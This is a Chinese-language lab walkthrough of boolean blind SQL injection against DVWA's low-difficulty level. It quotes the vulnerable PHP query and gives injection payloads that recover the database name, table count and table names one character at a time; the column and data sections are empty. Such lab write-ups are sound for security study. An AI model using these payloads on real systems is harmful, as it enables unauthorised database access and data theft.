---
{"dg-publish":true,"dg-path":"安全/靶场/DVWA-SQL盲注-easy.md","permalink":"/安全/靶场/DVWA-SQL盲注-easy/"}
---


界面就一个输入框，要求输入ID
![Pasted image 20240731182251.png](/img/user/picture/Pasted%20image%2020240731182251.png)

当能在数据库中搜索到这个ID时则会返回
`User ID exists in the database.`     ->    ture
 
否则则会返回
`User ID is MISSING from the database.`   ->    false

# 布尔盲注

他的php源码查询语句如下：
```php
`$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";`
```
也就是会将id带入查询，之后如果有查询结果，则会返回第一条语句，如果查询结果为空，则会返回第二条语句
**满足布尔注入条件**



## 获取数据库名


输入  为ture
```sql
1'  and length(database())=4 #
```
则可知数据库名称长度为4

> [!NOTE] 利用函数
> `length(database())`


**接下来来逐个字母破解数据库名称**
> [!NOTE] 利用函数
> `left(database(),1)='p'`
> 或者
> `substr(database(),1,1)='p'`
> 或者
> `ascii(substr(database(),1,1))`
>> [!example] ⼆分法逐字猜解 
>>  `1' and ascii(substr(database(),1,1))>97 #`，显⽰存在，说明数据库名的第⼀个字符的ascii值⼤于 97（⼩写字母a的ascii值）； 
>>  `1' and ascii(substr(database(),1,1))<122 #`，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 122（⼩写字母z的ascii值）； 
>>  `1' and ascii(substr(database(),1,1))<109 #`，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 109（⼩写字母m的ascii值） 
>>  `1' and ascii(substr(database(),1,1))<103 #`，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 103（⼩写字母g的ascii值）； 
>>  `1' and ascii(substr(database(),1,1))<100 #`，显⽰不存在，说明数据库名的第⼀个字符的ascii值不 ⼩于100（⼩写字母d的ascii值）； 
>>  `1' and ascii(substr(database(),1,1))=100 #`，显⽰存在，说明数据库名的第⼀个字符的ascii值等于100（⼩写字母d的ascii值），所以数据库名的第⼀个字符的ascii值为100，即⼩写字母d。 
>>  重复以上步骤直到得出完整的数据库名dvwa 


输入下面内容时返回为ture
```
1'  and left(database(),1)='d' # 

1'  and left(database(),2)='dv' #

1'  and left(database(),3)='dvw' #

1'  and left(database(),4)='dvwa' #
```
则可知数据库名为`dvwa`


## 猜解表名

首先来猜解表的个数
```js
1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 # 
显⽰不存在 


1' and (select count(table_name) from information_schema.tables where table_schema=database())=2 # 
显⽰存在 
```

> [!note] 
> 原理是使用count()这个函数来判断table_name这个表的数量有几个 然后后面有一个where判断来指定是当前数据库 在末尾有一个 =1 ，意思是判断表有1个，正确那么页面返回正常，错误即返回不正常

我们判断出当前数据库名下的表有两个


**猜解表名长度:**

```js
1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9 #
显⽰存在

1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=5 #
显⽰存在
```

> [!note] 
> ```js
> length(
> 	(select table_name from information_schema.tables where table_schema=database() limit 0,1)
> 	)=9
> 
>```
> 注意：
> `length`函数的参数应该是一个字符串
> 	`limit 0,1`：限制结果，只返回第一行。这是一个偏移量为0（即从第0行开始），获取1行的限制条件。因此，子查询返回的是当前数据库中的第一个表名。

说明两个表名长度分别是5和9


下面猜解两个表名
```js
1' and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='g' # 
显⽰存在


1' and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)='gu' # 
显⽰存在

...


1' and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),9)='guestbook' # 
显⽰存在
```

第一个表明为guestbook


```js
1' and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='u' # 
显⽰存在


1' and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),2)='us' # 
显⽰存在

...

1' and left((select table_name from information_schema.tables where table_schema=database() limit 1,1),5)='users' # 
显⽰存在
```
第一个表明为users




**下面的内容大同小异，就不再过多赘述**

## 猜解表中的字段名




## 猜解数据


